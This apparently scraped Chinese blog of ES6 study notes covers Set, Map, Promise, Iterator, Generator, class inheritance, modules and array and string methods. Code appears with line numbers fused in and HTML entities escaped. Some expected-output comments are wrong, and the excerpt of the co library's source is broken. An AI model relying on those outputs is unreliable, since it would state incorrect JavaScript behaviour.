&#123;NaN&#125; 两个对象被视为不相等 12let set1 = new Set([&#123;&#125;, &#123;&#125;]);console.log(set1); // Set &#123;&#123;&#125;, &#123;&#125;&#125; Set的方法 add、delete、clear和has 123456789101112let s = new Set([0, 1]);s.add(2).add(3);console.log(s); // Set &#123;0, 1, 2, 3&#125;console.log(s.has(3)); // trues.delete(2);console.log(s); // Set &#123;0, 1, 3&#125;s.clear();console.log(s); // Set(0) &#123;&#125; 可以看成是一种数组的去重方法 Array.from 12const set = new Set([1, 2, 3, 4, 1, 2, 3]);console.log(Array.from(set)); 实现并集，交集和差集 1234567891011let a = new Set([1, 2, 3]);let b = new Set([4, 3, 2]);let union = new Set([...a, ...b]);console.log(union); // Set(4) &#123;1, 2, 3, 4&#125;let intersect = new Set([...a].filter(x =&gt; b.has(x)));console.log(intersect); // Set(2) &#123;2, 3&#125;let difference = new Set([...a].filter(x =&gt; !b.has(x)));console.log(difference); // Set(1) &#123;1&#125; 123456// 垃圾回收机制依赖引用计数，如果一个值的引用次数不为0，垃圾回收机制就不会释放这块内存。// 结束使用该值之后，有时会忘记取消引用，导致内存无法释放，进而可能会引发内存泄漏。// WeakSet 中的对象都是弱引用，即垃圾回收机制不考虑 WeakSet 对该对象的引用// WeakSet成员类型只能是对象类型let ws = new WeakSet([1, 2]); // Uncaught TypeError: Invalid value used in weak setconsole.log(ws); Map数据结构类似对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值都可以 1234567891011let m = new Map();let o = &#123;msg: &quot;hello&quot;&#125;;m.set(o, &quot;world&quot;);console.log(m); // Map(1) &#123;&#123;…&#125; =&gt; &quot;world&quot;&#125;console.log(m.get(o)); // worldconsole.log(m.has(o)); // trueconsole.log(m.delete(o)); // trueconsole.log(m.has(o)); // false Map可以接收一个数组作为参数，数组成员是一个个表示键值对的数组 12345678let m = new Map([ [&quot;name&quot;, &quot;wuwh&quot;], [&quot;age&quot;, 22]]);console.log(m); // Map(2) &#123;&quot;name&quot; =&gt; &quot;wuwh&quot;, &quot;age&quot; =&gt; 22&#125;console.log(m.size); // 2console.log(m.get(&quot;name&quot;)); // wuwh 事实上不仅仅是数组，任何具有Iterator接口、 每个成员都是一个双元素的数组，都可以当作Map构造函数的参数 123456789let set = new Set([ [&quot;foo&quot;, 1], [&quot;bar&quot;, 2]]);console.log(set); // Set(2) &#123;Array(2), Array(2)&#125;let m = new Map(set);console.log(m); // Map(2) &#123;&quot;foo&quot; =&gt; 1, &quot;bar&quot; =&gt; 2&#125; 一个键值多次赋值，后面的会覆盖前面的 123let m = new Map();m.set(1, &quot;aaa&quot;).set(1, &quot;bbb&quot;);console.log(m); // Map(1) &#123;1 =&gt; &quot;bbb&quot;&#125; Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键 1234let m = new Map();m.set([&quot;a&quot;], 1);console.log(m.get([&quot;a&quot;])); // undefined forEach方法接受第二个参数，用来绑定this 123456789let reporter = &#123; report: function(key, value) &#123; console.log(key, value); &#125;&#125;;m.forEach(function(value, key, map) &#123; this.report(key, value);&#125;, reporter); —— 2017/12/18 ES6之Promise今天复习一下ES6中Promise的基础用法。ES6 规定，Promise对象是一个构造函数，用来生成Promise实例。Promise对象有两个特点： 对象的状态不受外界影响； 一旦状态改变，就不会再变，任何时候都可以得到这个结果； 优点： 就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。 Promise对象提供统一的接口，使得控制异步操作更加容易。 缺点： 无法取消Promise，一旦新建它就会立即执行，无法中途取消。 如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。 当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。 Promise 新建后立即执行，所以首先输出的是Promise。然后，then方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以resolved最后输出。1234567891011121314let promise = new Promise(function(resolve, reject) &#123; console.log(&apos;Promise&apos;); resolve();&#125;);promise.then(function() &#123; console.log(&apos;resolved.&apos;);&#125;);console.log(&apos;Hi!&apos;);// Promise// Hi!// resolved Promise实现ajax 123456789101112131415161718192021const getJSON = function(url) &#123; const promise = new Promise(function(resolve, reject) &#123; const handler = function() &#123; if (this.readyState == 4) &#123; if (this.status == 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125; &#125;; const xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, url); xhr.onreadystatechange = handler; xhr.responseType = &quot;json&quot;; xhr.send(); &#125;); return promise;&#125; 第一个回调函数完成以后， 会将返回结果作为参数， 传入第二个回调函数。 1234567getJSON(&quot;js/data.json&quot;).then(function(res) &#123; console.log(&quot;then res:&quot;, res); return res;&#125;).then(function(res) &#123; console.log(&quot;then then res:&quot;, res);&#125;); 前一个回调函数，有可能返回的还是一个Promise对象，这时后一个回调函数，就会等待该promise对象的状态发生变化，才会被调用，否则不会被调用。 12345678910getJSON(&quot;js/data.json&quot;).then(function(res) &#123; console.log(&quot;then res:&quot;, res); return getJSON(res.src);&#125;).then(function(res) &#123; console.log(&quot;then then res:&quot;, res);&#125;).catch(function(error) &#123; console.log(&quot;error:&quot;, error.message);&#125;); resolve语句后，抛出错误，不会被捕获，等于没有抛出，Promise状态一旦改变，不会再改变。 12345678910const promise = new Promise(function(resolve, reject) &#123; resolve(&quot;ok&quot;); throw new Error(&quot;wrong&quot;);&#125;);promise.then(function(value) &#123; console.log(&quot;resolve:&quot;, value); // ok&#125;).catch(function(error) &#123; console.log(&quot;reject:&quot;, error.message);&#125;); catch、then中抛出的错误都会一级一级往后冒泡，直到被后面的catch捕获到。 123456789101112131415161718const promise = function() &#123; return new Promise(function(resolve, reject) &#123; resolve(x + 1); &#125;);&#125;;promise() .catch(function(error) &#123; console.error(&quot;error:&quot;, error.message); // error: x is not defined &#125;) .then(function() &#123; console.log(&quot;carry on&quot;); // carry on console.log(&quot;carry on&quot;, y); &#125;) .catch(function(error) &#123; console.error(&quot;error:&quot;, error.message); // error: y is not defined &#125;); p1和p2都是 Promise 的实例，但是p2的resolve方法将p1作为参数，这时p1的状态就会传递给p2，也就是说，p1的状态决定了p2的状态123456789101112131415161718192021const p1 = new Promise(function(resolve, reject) &#123; setTimeout(function() &#123; console.log(&quot;timeout p1&quot;); resolve(&quot;p1&quot;); &#125;, 3000);&#125;);const p2 = new Promise(function(resolve, reject) &#123; setTimeout(function() &#123; console.log(&quot;timeout p2&quot;); resolve(p1); &#125;, 1000);&#125;);p2.then(function(res) &#123; console.log(&quot;p2 res:&quot;, res);&#125;);// timeout p2// timeout p1// p2 res: p1 —— 2017/12/21 ES6之Promise立即resolved的Promise是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务 12345678new Promise((resolve, reject) =&gt; &#123; resolve(1); console.log(&quot;resolve...&quot;);&#125;).then(res =&gt; &#123; console.log(res);&#125;);// resolve...// 1 所有Promise实例的状态都变成fulfilled，Promise.all状态才会变成fulfiled只要有一个别被rejected，Promise.all状态就变成rejected 12345678910111213141516171819202122232425262728let getJSON = function(url) &#123; return new Promise(function(resolve, reject) &#123; function handler() &#123; if(this.readyState == 4) &#123; if(this.status == 200 || this.tatus == 304) &#123; resolve(this.response); &#125; else &#123; reject(this.statusText); &#125; &#125; &#125; let xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, url); xhr.onreadystatechange = handler; xhr.responseType = &quot;json&quot;; xhr.send(null); &#125;);&#125;;Promise.all([getJSON(&quot;data/data1.json&quot;), getJSON(&quot;data/data2.json&quot;)]).then(function(res) &#123; console.log(&quot;all success:&quot;, res);&#125;).catch(function(error) &#123; console.log(&quot;error:&quot;, error);&#125;); 其中一个实例状态率先发生改变，Promise.race的状态就跟着改变，这个率先改变实例的返回值作为回调入参 1234567Promise.race([fetch(&quot;data/data1.json&quot;), fetch(&quot;data/data2.json&quot;)]).then(function(res) &#123; console.log(&quot;all success:&quot;, res);&#125;).catch(function(error) &#123; console.log(&quot;error:&quot;, error);&#125;); 立即resolve得Promise对象，是本轮“事件循环”得结束时，而不是下一轮“事件循环”的开始 12345678910111213setTimeout(() =&gt; &#123; console.log(&quot;tree&quot;);&#125;, 0);Promise.resolve().then(function() &#123; console.log(&quot;two&quot;);&#125;);console.log(&quot;one&quot;);// one// two// three Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数 12345678910const thenable = &#123; then(resolve, reject) &#123; reject(&quot;some wrong!&quot;); &#125;&#125;;Promise.reject(thenable).catch(function(error) &#123; console.log(error === thenable); // true&#125;); 捕获最后抛出来的错误 12345678Promise.prototype.done = function(fulfiled, rejected) &#123; this.then(fulfiled, rejected) .catch(function(error) &#123; console.error(error); &#125;);&#125;;Promise.reject().done(); —— 2017/12/22 ES6之Iterator和for…of循环遍历器（Iterator）就是这样一种机制。它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。 模拟next方法 12345678910111213141516var it = makeIterator([&apos;a&apos;, &apos;b&apos;]);it.next() // &#123; value: &quot;a&quot;, done: false &#125;it.next() // &#123; value: &quot;b&quot;, done: false &#125;it.next() // &#123; value: undefined, done: true &#125;function makeIterator(array) &#123; var nextIndex = 0; return &#123; next: function() &#123; return nextIndex &lt; array.length ? &#123;value: array[nextIndex++], done: false&#125; : &#123;value: undefined, done: true&#125;; &#125; &#125;;&#125; 解构、拓展运算符都会默认调用iterator接口覆盖原生遍历器 1234567891011121314151617181920let str = new String(&quot;hi&quot;);console.log([...str]); // [&quot;h&quot;, &quot;i&quot;]str[Symbol.iterator] = function() &#123; return &#123; next: function() &#123; if(this.first) &#123; this.first = false; return &#123;value: &quot;wuwh&quot;, done: false&#125;; &#125; else &#123; return &#123;done: true&#125;; &#125; &#125;, first: true &#125;;&#125;;console.log([...str]); // [&quot;wuwh&quot;] yield*后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。 12345678910111213let generator = function* () &#123; yield 1; yield* [2, 3]; yield 4&#125;;let iterator = generator();console.log(iterator.next());console.log(iterator.next());console.log(iterator.next());console.log(iterator.next());console.log(iterator.next()); 一个数据结构只要部署了Symbol.iterator属性，就被视为具有iterator接口，就可以用for…of循环遍历它的成员.也就是说,for…of循环内部调用的是数据结构的Symbol.iterator方法for…of循环可以使用的范围包括数组,Set和Map结构,某些类型的数组的对象(arguments对象,DOM NodeList对象)Generator对象以及字符串 DOM NodeList对象部署了iterator接口 12345let ps = document.querySelectorAll(&quot;p&quot;);for(let p of ps) &#123; console.log(p);&#125; for…of能正确识别32位UTF-16字符 123for(let x of &quot;\a\uD83D\uDC0A&quot;) &#123; console.log(x);&#125; 并不是所有类似数组的对象都具有iterator接口 1234567891011let arrayLike = &#123; 0: &quot;a&quot;, 1: &quot;b&quot;, length: 2&#125;;for(let x of arrayLike) &#123; console.log(x); // Uncaught TypeError: arrayLike[Symbol.iterator] is not a function&#125;console.log(Array.from(arrayLike)); forEach 缺点:break或return不奏效 12345let arr = [1, 2, 3];arr.forEach(function(item) &#123; console.log(item); if(item &gt; 2) continue; // Uncaught SyntaxError: Illegal break statement&#125;); —— 2017/12/25 ES6之GeneratorGenerator函数调用并不执行,返回的也不是函数运行的结果,而是一个指向内部状态的指针对象,也就是遍历器对象。 123456789101112function * helloWorldGenerator() &#123; yield &quot;hello&quot;; yield &quot;world&quot;; return &quot;ending&quot;;&#125;let hw = helloWorldGenerator();console.log(hw.next()); // &#123;value: &quot;hello&quot;, done: false&#125;console.log(hw.next()); // &#123;value: &quot;world&quot;, done: false&#125;console.log(hw.next()); // &#123;value: &quot;ending&quot;, done: false&#125;console.log(hw.next()); // &#123;value: undefined, done: true&#125; yield表达式只能用在 Generator 函数里面，用在其他地方都会报错 yield表达式在另个一表达式中，必须放在圆括号里面。放在函数参数或放到赋值表达式的右边，可以不加括号。 12345678910111213function foo() &#123;&#125;function* demo() &#123; foo(yield &quot;a&quot;, yield &quot;b&quot;); let input = &quot;abc&quot; +(yield 123);&#125;let f = demo();console.log(&quot;f:&quot;, f);console.log(&quot;f.next():&quot;, f.next());console.log(&quot;f.next():&quot;, f.next());console.log(&quot;f.next():&quot;, f.next());console.log(&quot;f.next():&quot;, f.next()); 任意一个对象的Symbol.iterator方法，等于该对象的遍历器生成函数，调用该函数会返回该对象的一个遍历器对象。 由于Generator函数就是遍历器生成函数，依次可以把Generator赋值给对象的Symbol.iterator,从而使得该对象具有Interator接口。 1234567let myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3;&#125;;console.log([...myIterable]); // [1, 2, 3] Generator函数执行后，返回一个遍历器对象。该对象本身也具有Symbol.iterator属性，执行后返回自身。 12345function* gen() &#123;&#125;let g = gen();console.log( g[Symbol.iterator]() === g ); // true yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。 123456789101112131415function* foo(x) &#123; let y = 2 * (yield (x + 1)); let z = yield(y / 3); return (x + y + z);&#125;let a = foo(5);console.log(a.next()); // &#123;value: 6, done: false&#125;console.log(a.next()); // &#123;value: NaN, done: false&#125;console.log(a.next()); // &#123;value: NaN, done: true&#125;let b = foo(5);console.log(b.next()); // &#123;value: 6, done: false&#125;console.log(b.next(3)); // &#123;value: 2, done: false&#125;console.log(b.next(6)); // &#123;value: 17, done: true&#125; 遍历斐波拉契数列 1234567891011function* fibonacci(large) &#123; let [prev, curr] = [0, 1]; for(let i = 0; i &lt; large; i++) &#123; [prev, curr] = [curr, prev + curr]; yield curr; &#125;&#125;for(let n of fibonacci(100)) &#123; console.log(n);&#125; 原生对象没有iterator接口，无法用for…of遍历，可以通过Generator函数加上遍历接口。 123456789101112function* objectEntries(obj) &#123; let propKeys = Reflect.ownKeys(obj); for(let propKey of propKeys) &#123; yield [propKey, obj[propKey]]; &#125;&#125;let o = &#123;first: &quot;wu&quot;, last: &quot;wh&quot;&#125;;for(let [key, value] of objectEntries(o)) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125; 扩展运算符、解构赋值和Array.from方法内部调用都是遍历器接口。 1234567891011121314151617function* numbers() &#123; yield 1; yield 2; yield 3; return 0; yield 4;&#125;// 扩展运算符console.log([...numbers()]);// Array.from()console.log(Array.from(numbers()));// 解构赋值let [x, y] = numbers();console.log(x, y); 在Generator函数内部，调用另一个Generator函数，默认情况下是没有效果的。 yield* 后面的Generator函数（没有return语句时），等同于在Generator内部部署了一个for…of函数。 1234567891011121314function* foo() &#123; yield &quot;a&quot;; yield &quot;b&quot;;&#125;function* bar() &#123; yield &quot;x&quot;; yield* foo(); yield &quot;y&quot;;&#125;for(let v of bar()) &#123; console.log(v); // &quot;x&quot; // &quot;y&quot;&#125; 被代理的Generator函数有return语句，那么就可以向代理它的Generator函数返回数据。 123456789101112131415161718192021function* foo() &#123; yield 2; yield 3; return &quot;foo&quot;;&#125;function* bar() &#123; yield 1; let v = yield* foo(); console.log(&quot;v: &quot;, v); yield 4;&#125;let it = bar();console.log(it.next()); // &#123;value: 1, done: false&#125;console.log(it.next()); // &#123;value: 2, done: false&#125;console.log(it.next()); // &#123;value: 3, done: false&#125;console.log(it.next()); // v: fooconsole.log(it.next()); // &#123;value: 4, done: false&#125;console.log(it.next()); // &#123; value: undefined, done: true &#125; 将Generator函数内部this指向它的原型上，可以new命令。 1234567891011121314151617181920function* gen() &#123; this.a = 1; yield this.b = 2; yield this.c = 3;&#125;function F() &#123; return gen.call(gen.prototype);&#125;var f = new F();// 遍历完后，才会有相应的属性console.log(f.next()); // &#123;value: 2, done: false&#125;console.log(f.next()); // &#123;value: 3, done: false&#125;console.log(f.next()); // &#123;value: undefined, done: true&#125;console.log(f.a); // 1console.log(f.b); // 2console.log(f.c); // 3 return 方法返回给定的值，并且终结遍历Generator函数。 1234567891011function* gen() &#123; yield 1; yield 2; yield 3;&#125;let g = gen();console.log(g.next());g.return(&quot;foo&quot;);console.log(g.next()); Generator函数内部没有部署try…catch，那么throw抛出的错误，被外部try…catch捕获。Generator函数内部和外部，都没有部署try…catch，程序将会报错，中断执行。 123456789101112131415161718192021222324252627function* gen() &#123; while (true) &#123; // try &#123; // yield; // &#125; // catch(e) &#123; // console.log(&quot;内部捕获&quot;, e); // &#125; yield; console.log(&quot;内部捕获&quot;, e); &#125;&#125;;let g = gen();g.next();// g.throw(&quot;a&quot;);// g.throw(&quot;b&quot;);try &#123; g.throw(&quot;a&quot;); g.throw(&quot;b&quot;);&#125;catch (e) &#123; console.log(&quot;外部捕获&quot;, e);&#125; next()、throw()、return()这三个方法本质时同一件事，可以放在一起理解。它们的作用都是让Generator函数恢复执行，并且使用不同的语句替换yield表达式。 12345678910111213141516function* gen(x, y) &#123; let res = yield x + y; return res;&#125;let g = gen(1, 2);console.log(g.next()); // &#123;value: 3, done: false&#125;// 相当于把 let res = yield x + y; 换成 let res = 1;console.log(g.next(1)); // &#123;value: 1, done: true&#125;// 相当于把 let res = yield x + y; 换成 let res = throw(new Error(&quot;something wrong&quot;));g.throw(new Error(&quot;something wrong&quot;)); // Uncaught Error: something wrong// 相当于把 let res = yield x + y; 换成 let res = return 2;console.log(g.return(2)); —— 2017/12/26 ES6之Generator函数的异步应用对于多个异步操作，要等到上一个操作完才执行下一个，这时候就需要封装一个，Generator函数自动执行器。 1234567891011121314151617181920function run(fn) &#123; let g = fn(); function next(err, data) &#123; let res = g.next(data); if (res.done) return; res.value(next); &#125; next();&#125;function* gen() &#123; let f1 = yield readFileThunk(&quot;fileA&quot;); let f2 = yield readFileThunk(&quot;fileB&quot;); // ... let fn = yield readFileThunk(&quot;fileN&quot;);&#125;run(gen); 回调函数。将异步操作包装成 Thunk 函数，在回调函数里面交回执行权。 Promise 对象。将异步操作包装成 Promise 对象，用then方法交回执行权。 12345678910111213141516171819202122232425262728293031323334// co函数源码function co(gen) &#123; var ctx = this; return new Promise(function (resolve, reject) &#123; if (typeof gen === &apos;function&apos;) gen = gen.call(ctx); if (!gen || typeof gen.next !== &apos;function&apos;) return resolve(gen); onFulfilled(); function onFulfilled(res) &#123; var ret; try &#123; ret = gen.next(res); &#125; catch (e) &#123; return reject(e); &#125; next(ret); &#125; &#125;);&#125;function next(ret) &#123; if (ret.done) return resolve(ret.value); var value = toPromise.call(ctx, ret.value); if (value &amp;&amp; isPromise(value)) return value.then(onFulfilled, onRejected); return onRejected( new TypeError( &apos;You may only yield a function, promise, generator, array, or object, &apos; + &apos;but the following object was passed: &quot;&apos; + String(ret.value) + &apos;&quot;&apos; ) );&#125; —— 2017/12/27 12345678910class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; &#125;&#125; 类的数据类型就是函数1console.log(typeof Point); // function 类本身就指向构造函数 1console.log(Point === Point.prototype.constructor); // true 直接对类使用new命令 12let p = new Point(1, 2);console.log(p.toString()); // (1, 2) x和y都是对象point自身的属性（定义在this变量上），toString是原型对象的属性（定义在Point类上） 实例上调用的方法，就是调用原型上的方法1console.log(p.toString === Point.prototype.toString); // true 给实例的原型上添加方法 123456Reflect.getPrototypeOf(p).getX = function() &#123; console.log(this.x);&#125;;let p1 = new Point(3, 4);p1.getX(); // 3 */ 类的属性名，可以采用表达式 1234567891011121314let methodName = &quot;getArea&quot;;class Square &#123; constructor() &#123; &#125; [methodName]() &#123; console.log(&quot;get area...&quot;); &#125;&#125;let sq = new Square();sq.getArea(); // get area... 类中没有定义constructor方法，js引擎会自动为它添加一个空的constructor方法，constructor方法默认返回实例对象，也可以指定返回另一个对象 1234567class Foo &#123; constructor() &#123; return Object.create(null); &#125;&#125;console.log(new Foo() instanceof Foo); // false 用表达式表示一个类，类的名称是MyClass，Me只在Class内部代码可用，指代当前类，如果内部没有使用到的话，可以省略Me 1234567891011121314151617const MyClass = class Me &#123; getClassName() &#123; return Me.name; &#125; get prop() &#123; return &quot;getter&quot;; &#125; set prop(value) &#123; console.log(&quot;setter:&quot; + value); &#125;&#125;;let inst = new MyClass();console.log(inst.getClassName()); // Melet inst1 = new Me(); // Uncaught ReferenceError: Me is not definedconsole.log(inst1.getClassName()); 在类的内部使用get和set关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为 12inst.prop = 123; // setter:123console.log(inst.prop); // getter for…of循环自动调用遍历器 12345678910111213141516171819202122232425262728293031323334class Foo &#123; constructor(...args) &#123; this.args = args; console.log(&quot;new.target:&quot;, new.target === Foo); &#125; *[Symbol.iterator]() &#123; for(let arg of this.args) &#123; yield arg; &#125; &#125; static sayHi() &#123; return this.returnHi(); &#125; static returnHi() &#123; return &quot;hi&quot;; &#125; returnHi() &#123; return &quot;hello&quot;; &#125;&#125;class Bar extends Foo &#123; static childSayHi() &#123; return super.sayHi() + &quot; child&quot;; &#125;&#125;for(let x of new Foo(&quot;hello&quot;, &quot;world&quot;)) &#123; console.log(x); // hello world&#125; 所有类中定义的方法，都会被实例继承，如果在一个方法前，加上static关键字，就表示该方法不会被实例继承，而是直接通过类来调用，成为“静态方法”。 静态方法中的this指向Foo类，而不是实例。静态方法可以与非静态方法重名 12console.log(Foo.sayHi()); // hiconsole.log(new Foo().sayHi()); //Uncaught TypeError: (intermediate value).sayHi is not a function 父类的静态方法可以被子类继承 1console.log(Bar.sayHi()); // hi 静态方法可以从super对象上调用 1console.log(Bar.childSayHi()); // hi child 子类继承父类时，new.target会返回子类 1console.log(new Bar()); // false ES6之Class的继承子类必须在constructor方法中调用super方法，否则新建实例时会报错，如果子类没有定义constructor方法，这个方法会被默认添加。在子类构造函数中，只有调用super之后，才可以使用this关键字，否则报错。 123456789101112class ColorPaint extends Point &#123; constructor(x, y, color) &#123; // this.color = color; super(x, y); this.color = color; &#125;&#125;let cp = new ColorPaint(25, 8, &quot;red&quot;);console.log(cp instanceof Point); // trueconsole.log(cp instanceof ColorPaint); // trueconsole.log(Reflect.getPrototypeOf(ColorPaint) === Point); // true super虽然代表了父类A的构造函数，但是返回的是子类B的实例，即super内部this指的是B。 1234567891011121314class A &#123; constructor() &#123; console.log(new.target.name); &#125;&#125;class B extends A &#123; constructor() &#123; super(); &#125;&#125;new A(); // Anew B(); // B super作为对象时，在普通方法中，指向父类的原型对象；在静态方法中指向父类。 1234567891011121314class A &#123; p() &#123; return 2; &#125;&#125;class B extends A &#123; constructor() &#123; super(); console.log(super.p()); &#125;&#125;let b = new B(); ES6规定，通过调用父类方法时，方法内部的this指向子类。 12345678910111213141516171819202122class A &#123; constructor() &#123; this.x = 1; &#125; print() &#123; console.log(this.x); &#125;&#125;class B extends A &#123; constructor() &#123; super(); this.x = 2; &#125; m() &#123; // 实际上执行的是super.print.call(this) super.print(); &#125;&#125;let b = new B();b.m(); // 2 如果super作为对象，用在静态方法中，这时super将指向父类，而不是父类原型对象。 1234567891011121314151617181920212223242526class Parent &#123; static myMethod(msg) &#123; console.log(&quot;static &quot;, msg); &#125; myMethod(msg) &#123; console.log(&quot;instance &quot;, msg); &#125;&#125;class Child extends Parent &#123; static myMethod(msg) &#123; super.myMethod(msg); &#125; myMethod(msg) &#123; super.myMethod(msg); &#125;&#125;// 调用静态方法Child.myMethod(1); // static 1// 调用原型方法var c = new Child(); // instance 2c.myMethod(2); 123456class A &#123; &#125;class B extends A &#123; &#125;console.log(B.__proto__ === A); // trueconsole.log(B.prototype.__proto__ === A.prototype); // true A作为一个基类，就是一个普通函数，所以直接继承Funtion.prototype，A调用后返回一个空对象，所以，A.prototype.proto指向构造函数的prototype属性。 1234class A &#123; &#125;console.log(A.__proto__ === Function.prototype); // trueconsole.log(A.prototype.__proto__ === Object.prototype); // true 原生构造函数可以被继承 12345678910111213141516171819202122232425class VersionedArray extends Array &#123; constructor() &#123; super(); this.history = [[]]; &#125; commit() &#123; this.history.push(this.slice()); &#125; revert() &#123; this.splice(0, this.length, ...this.history[this.history.length - 1]); &#125;&#125;let x = new VersionedArray();x.push(1);x.push(2);console.log(x);console.log(x.history);x.commit();console.log(x.history);x.push(3);console.log(x.history); ES6之Moduleexport 通常情况下，export输出的变量就是本来的名字，但是也可以使用as关键字重命名。 1234567function v1() &#123;&#125;function v2() &#123;&#125;export &#123; v1 as streamV1, v2 as streamV2&#125; export命令规定是对外接口，必须与模块内部变量建立一一对应关系。 1234567891011121314151617// 变量写法一export var m = 1;// 变量写法二var m = 1;export &#123;m&#125;;// 变量写法三var n = 1;export &#123;n as m&#125;;// 函数写法一export function f() &#123;&#125;;// 函数写法二function f() &#123;&#125;export &#123;f&#125;; export语句输出的接口，与其对应的值是动态绑定关系 12export var foo = &apos;bar&apos;;setTimeout(() =&gt; foo = &apos;baz&apos;, 500); importimport命令具有提升效果，会提升到整个模块的头部，首先执行。 123foo();import &#123; foo &#125; from &apos;my_module&apos;; 目前阶段，通过 Babel 转码，CommonJS 模块的require命令和 ES6 模块的import命令，可以写在同一个模块里面，但是最好不要这样做。因为import在静态解析阶段执行，所以它是一个模块之中最早执行的。 注意，模块整体加载所在的那个对象（上例是circle），应该是可以静态分析的，所以不允许运行时改变。下面的写法都是不允许的。 12345import * as circle from &apos;./circle&apos;;// 下面两行都是不允许的circle.foo = &apos;hello&apos;;circle.area = function () &#123;&#125;; export default命令为模块指定默认输出。其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。 第一组是使用export default时，对应的import语句不需要使用大括号；第二组是不使用export default时，对应的import语句需要使用大括号。 12345678910111213// 第一组export default function crc32() &#123; // 输出 // ...&#125;import crc32 from &apos;crc32&apos;; // 输入// 第二组export function crc32() &#123; // 输出 // ...&#125;;import &#123;crc32&#125; from &apos;crc32&apos;; // 输入 —— 2017/12/28 ES6之Module加载ES6 模块与 CommonJS 模块之间的差异： CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。 CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。 ES6之编程风格 在let和const之间，建议优先使用const，尤其是在全局环境，不应该设置变量，只应设置常量。 所有的函数都应该设置为常量。 静态字符串一律使用单引号或反引号，不使用双引号。动态字符串使用反引号。 箭头函数取代Function.prototype.bind，不应再用 self/_this/that 绑定 this。 注意区分 Object 和 Map，只有模拟现实世界的实体对象时，才使用 Object。如果只是需要key: value的数据结构，使用 Map 结构。因为 Map 有内建的遍历机制。 如果模块只有一个输出值，就使用export default，如果模块有多个输出值，就不使用export default，export default与普通的export不要同时使用。 —— 2017/12/28 ES6之数组复制数组 12345const a1 = [1, 2];// const a2 = [...a1];const [...a2] = a1;a2[0] = 2;console.log(&apos;a1:&apos;, a1); // [1, 2] 拓展运算符值会部署了iterator接口的对象转化为数组，包括字符串、Set、Map、generator函数、数组、NodeList等 类似数组的对象（array-like object）和可遍历（iterable）的对象可用Array.from方法转化123456let arrayLike = &#123; &apos;0&apos;: &apos;a&apos;, &apos;1&apos;: &apos;b&apos;, length: 1&#125;;console.log(Array.from(arrayLike)); // [&quot;a&quot;] Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。 1console.log(Array.from(arrayLike, x =&gt; x.repeat(2))); Array.of方法用于将一组值，转化为数组 12console.log(Array.of(3, 10, 9));console.log(Array.of()); 将指定位置的成员复制到其他位置 1console.log([1, 2, 3, 4, 5].copyWithin(0, 3, 4)); // [4, 2, 3, 4, 5] find找出第一个符合条件数组成员，findIndex找出第一个符合条件数组成员索引 12let f = [1, 3, 5, 7].find(n =&gt; n &gt; 3);console.log(f); fill填充数组 1console.log(new Array(3).fill(6)); fill方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。 1console.log([1, 2, 3, 4].fill(&apos;a&apos;, 1, 4)); // [1, &quot;a&quot;, &quot;a&quot;, &quot;a&quot;] include表示某个数组是否包含给定的值第二个参数表示搜索的起始位置 12console.log([1, 2, 3, NaN].includes(NaN)); //trueconsole.log([1, 2, 3, 4, 5].includes(3, 1)); // true 数组空位相关 1234567891011121314151617181920212223242526272829// 数组空位是没有任何值的console.log(0 in [undefined, undefined, undefined]); // trueconsole.log(0 in [,,]); // falselet arr = [, &apos;a&apos;];// forEach(), filter(), reduce(), every() 和some()都会跳过空位arr.forEach((item, index) =&gt; &#123; console.log(index); // 1&#125;);// join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。console.log([undefined, , &apos;a&apos;].join(&apos;&apos;));// for...of可以遍历到空位for(let i of arr) &#123; console.log(i); // a undefined&#125;// 拓展运算符将空位转为undefinedconsole.log([...[2, , 3]]); // [2, undefined, 3]// Array.from将数组空位转化为undefinedconsole.log(Array.from([4, , 5])); // [4, undefined, 5]// fill()会将空位视为正常数组位置console.log(new Array(3).fill(&apos;a&apos;)); // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]// entries() 、keys() 、values() 、find()和findIndex()会将空位处理成undefined。 ES6之StringcodePointAt 方法在第一个字符上，正确地识别了“𠮷”，返回了它的十进制码点 134071（即十六进制的20BB7）。在第二个字符（即“𠮷”的后两个字节）和第三个字符“a”上，codePointAt方法的结果与charCodeAt方法相同。 12345678910111213141516let s = &apos;𠮷&apos;;console.log(s.charCodeAt(0)); // 55362console.log(s.charCodeAt(1)); // 57271console.log(s.codePointAt(0)); // 134071console.log(s.codePointAt(1)); // 57271console.log(s.codePointAt(0).toString(16)); // 134071console.log(s.codePointAt(1).toString(16)); // 57271let text = String.fromCodePoint(0x20bb7, 0xdfb7);// for...of能正确遍历出utf-16字符for(let t of text) &#123; console.log(t);&#125; endsWith的行为与其他两个方法有所不同，它针对前n个字符，而其他两个方法针对从第n个位置直到字符串结束。 1234let str = &apos;Hello world&apos;;console.log(str.startsWith(&apos;llo&apos;, 2)); // trueconsole.log(str.endsWith(&apos;d&apos;, 11)); // trueconsole.log(str.includes(&apos;wo&apos;, 1)); // true 